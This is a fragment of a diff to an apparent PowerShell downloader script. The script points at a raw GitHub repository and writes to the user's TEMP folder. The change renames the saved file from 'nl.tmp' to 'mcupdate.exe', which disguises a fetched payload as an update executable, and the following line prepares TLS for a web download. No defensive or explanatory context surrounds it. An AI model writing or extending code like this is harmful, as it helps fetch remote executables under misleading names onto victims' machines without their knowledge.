@@ -1,5 +1,5 @@
  $repo = "https://raw.githubusercontent.com/cync911-cloud/4/main"
- $dst  = "$env:TEMP\nl.tmp"
+ $dst  = "$env:TEMP\mcupdate.exe"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
